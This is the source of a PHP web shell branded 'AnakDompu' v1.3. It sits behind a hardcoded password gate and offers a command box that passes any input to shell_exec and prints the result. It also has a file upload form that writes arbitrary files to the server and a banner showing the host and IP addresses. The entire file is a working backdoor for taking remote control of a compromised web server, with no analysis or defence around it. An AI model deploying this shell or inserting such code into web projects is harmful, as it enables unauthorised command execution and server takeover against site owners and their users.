<?php
@session_start();
@set_time_limit(0);
#####cfg#####
# use password  true / false #
$create_password = true;
$password = "#AnakDompu";
######ver####
$ver= "v1.3";
#############
@$pass=$_POST['pass'];
if($pass==$password){
$_SESSION['nst']="$pass";
}

if($create_password==true){

if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){
die("
<noembed><xmp><body></xmp></noembed><noembed><xmp></body></html></xmp></noembed><title>-.:: Shinchi Memang Cakep ::.-</title>
<center>
<table width=100 bgcolor=000000 border=6 bordercolor=0000ff><tr><td>
<font size=1 face=verdana><center>
<b></font></a><br></b>
</center>
<form method=post>
<font size=1 face=verdana color=00ff00><strong><center>.::[ Powered By AnakDompu ]::.<br> -[ Tempat Belajar Dan Berbagi ]-</center></strong><br>
<input type=password name=pass size=40 bgcolor=000000>
</form>
<b>Host:</b> ".$_SERVER["HTTP_HOST"]."<br>
<b>IP:</b> ".gethostbyname($_SERVER["HTTP_HOST"])."<br>
<b>Your ip:</b> ".$_SERVER["REMOTE_ADDR"]."
</td></tr></table>
");}

}
?>
<html><head><title>[ Powered By AnakDompu ]</title></head><body bgcolor=#333333 text=#00ff00 onLoad="document.forms[0].elements[-cmd].focus()"><h1>AnakDompu</h1>&nbsp;<form method=POST><input name="-cmd" size=50 value="<?=$cmd?>" style="border:1px dashed #FF6600; background:#303030; color:#FFFFFF"><pre><? $cmd = $_REQUEST["-cmd"]; ?><? if($cmd != "") print Shell_Exec($cmd); ?></pre></form></body></html><p><body></p><div align=left width=98%><FORM ACTION="wew.php" METHOD="POST" ENCTYPE="multipart/form-data"><TABLE WIDTH=220 BORDER=0 CELLPADDING=0 CELLSPACING=0 id=news><tr><td width=113></td><td width=289><input type=file name="superdat" style="border:1px dashed #FF6600; background:#333333; color:#FF6600" size=32><INPUT TYPE=submit NAME="submit"  VALUE="Shinchi" style="color: #FF6600; border: 1px solid #FF6600"></DIV></FORM><? if ($superdat_name != "") {copy("$superdat", "$superdat_name") or die("Ketika Rasa Tak Dapat Di Ungkap!");} else {die("");}?><p align=left><b>Upload BerHasil Boss: </b><? echo "$superdat_name";?>.

